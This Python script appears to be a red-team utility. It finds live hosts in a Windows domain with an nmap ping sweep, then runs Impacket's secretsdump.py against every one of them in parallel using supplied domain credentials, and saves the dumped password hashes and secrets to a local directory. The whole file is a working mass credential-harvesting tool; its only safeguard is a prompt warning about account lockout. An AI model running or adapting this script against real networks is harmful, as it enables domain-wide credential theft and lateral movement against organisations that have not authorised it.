import argparse
import concurrent.futures
import os
import subprocess
import sys
from tqdm import tqdm
import logging
import re

# Setup logging to file
logging.basicConfig(filename='dumper.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

def is_valid_hostname(hostname):
    # Simple regex to check for valid hostname format
    if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\.-]{1,253}[a-zA-Z0-9]$', hostname):
        return True
    return False

def check_live_hosts(hosts):
    live_hosts = []
    try:
        # Create a temporary file to store hosts
        with open("temp_hosts.txt", "w") as temp_file:
            for host in hosts:
                temp_file.write(f"{host}\n")

        # Run nmap to find live hosts
        cmd = [
            "nmap", "-sn", "-iL", "temp_hosts.txt", "--min-hostgroup", "255",
            "--min-rtt-timeout", "0ms", "--max-rtt-timeout", "100ms", "--max-retries", "1",
            "--max-scan-delay", "0", "--min-rate", "2000"
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            output = result.stdout.splitlines()
            for line in output:
                if "Nmap scan report for" in line:
                    # Extract the hostname/IP from the line
                    parts = line.split()
                    if len(parts) >= 5:
                        live_host = parts[4]
                        live_hosts.append(live_host)
        else:
            logging.error(f"Nmap scan failed: {result.stderr}")
    finally:
        # Clean up temporary file
        if os.path.exists("temp_hosts.txt"):
            os.remove("temp_hosts.txt")

    return live_hosts

def run_secretsdump(host, domain, username, password, output_dir):
    output_file = os.path.join(output_dir, f"{host}.secretsdump")
    cmd = [
        "secretsdump.py",
        f"{domain}/{username}:{password}@{host}",
        "-outputfile", output_file
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    logging.debug(f"Command executed: {' '.join(cmd)}")
    logging.debug(f"Command output: {result.stdout}")
    logging.debug(f"Command error: {result.stderr}")
    error_message = None
    if "[-] RemoteOperations failed:" in result.stdout or "[-] RemoteOperations failed:" in result.stderr:
        error_output = result.stderr if "[-] RemoteOperations failed:" in result.stderr else result.stdout
        error_message = error_output.split("[-] RemoteOperations failed:")[1].strip()
    if error_message:
        logging.error(f"[!] Secretsdump against {host} failed: {error_message}")
        return f"[!] Secretsdump against {host} failed: {error_message}"
    elif result.returncode == 0:
        return f"[+] Secretsdump against {host} complete -> See output directory for results."
    else:
        return f"[!] Secretsdump against {host} failed: {result.stderr.strip()}"

def main():
    parser = argparse.ArgumentParser(description="Perform multithreaded Secretsdump against live hosts")
    parser.add_argument("-tf", "--target-file", required=True, help="File containing list of hostnames")
    parser.add_argument("-d", "--domain", required=True, help="Domain")
    parser.add_argument("-u", "--username", required=True, help="Username")
    parser.add_argument("-p", "--password", required=True, help="Password")
    parser.add_argument("-o", "--output", help="Output directory for secretsdump results [Default: <current-directory>/Secretsdump_Output]")
    args = parser.parse_args()

    # Confirm with the user about the risk of locking out the account
    confirmation = input(f"[*] User, you are about to perform large amounts of authentication attempts with the user \"{args.username}\". Are you cool with the potential of locking out this account? (Y/N): ").strip().lower()
    if confirmation != 'y':
        print("[!] Operation aborted by the user.")
        sys.exit(0)

    # Check if output directory is provided and writable
    output_dir = args.output if args.output else os.path.join(os.getcwd(), "Secretsdump_Output")
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    if not os.access(output_dir, os.W_OK):
        print(f"[!] Error: The output directory {output_dir} is not writable.", file=sys.stderr)
        logging.error(f"[!] The output directory {output_dir} is not writable.")
        sys.exit(1)

    # Read the target file
    with open(args.target_file, 'r') as f:
        hosts = [line.strip() for line in f if line.strip()]

    # Check if hosts contain IP addresses or CIDR notations
    if any('/' in host for host in hosts) or any(host.replace('.', '').isdigit() for host in hosts):
        print("[!] Error: Please provide a list of domain computers extracted from LDAP instead of IP addresses or CIDR ranges.", file=sys.stderr)
        logging.error("[!] Provided hosts file contains IP addresses or CIDR ranges. Please provide a list of domain computers extracted from LDAP.")
        sys.exit(1)

    # Check for valid hostnames
    invalid_hosts = [host for host in hosts if not is_valid_hostname(host)]
    if invalid_hosts:
        print(f"[!] Error: The following entries are not valid hostnames: {', '.join(invalid_hosts)}", file=sys.stderr)
        logging.error(f"[!] Invalid hostnames detected: {', '.join(invalid_hosts)}")
        sys.exit(1)

    # Check for live hosts
    print("[+] Finding live hosts...")
    live_hosts = check_live_hosts(hosts)
    logging.info(f"[+] Live hosts detected: {', '.join(live_hosts)}")

    # Perform secretsdump on live hosts
    if live_hosts:
        with tqdm(total=len(live_hosts), desc="Performing secretsdump", unit="host") as pbar:
            with concurrent.futures.ThreadPoolExecutor() as executor:
                future_to_host = {executor.submit(run_secretsdump, host, args.domain, args.username, args.password, output_dir): host for host in live_hosts}
                for future in concurrent.futures.as_completed(future_to_host):
                    host = future_to_host[future]
                    try:
                        result = future.result()
                        if "failed" in result:
                            print(f"[!] Secretsdump against {host} failed: {result}", file=sys.stderr)
                            logging.info(result)
                        else:
                            print(result)
                            logging.info(result)
                    except Exception as exc:
                        error_msg = f"[!] Error dumping secrets for host {host}: {exc}"
                        print(error_msg, file=sys.stderr)
                        logging.error(error_msg)
                    pbar.update(1)
                executor.shutdown(wait=False)

if __name__ == "__main__":
    main()
